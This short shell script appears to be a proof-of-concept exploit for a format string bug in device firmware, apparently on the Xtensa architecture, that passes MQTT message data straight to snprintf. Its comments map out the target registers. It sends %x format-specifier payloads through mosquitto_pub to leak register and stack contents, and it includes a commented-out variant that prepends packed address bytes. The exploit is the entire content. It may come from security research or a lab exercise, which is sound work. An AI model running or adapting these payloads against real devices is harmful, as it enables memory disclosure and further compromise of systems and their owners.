# The format string attack exists in the snprintf() function.
# The call is: snprintf(buf, sizeof(buf), event->data)
# buf is loaded into register A10.
# sizeof(buf) is loaded into A11.
# event->data is loaded into A12.
# Registers A13 - A15 (and the stack) are used for incoming arguments.

command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"

a1="a046fb3f"
a2="44434241"

nl_bin=$(echo "0a0d" | xxd -p -r)

a1_bin=$(echo $a1 | xxd -p -r)
a2_bin=$(echo $a2 | xxd -p -r)

# Reading the stack
$command_prefix "$nl_bin \
    Registers A13 - A15: %x %x %x $nl_bin \
    Stack frame: %x %x %x %x %x"


# mosquitto_pub -h localhost -p 1883 -t \
    # "/topic/qos0" -m "$a1_bin$a2_bin %x %x %20x %x %x"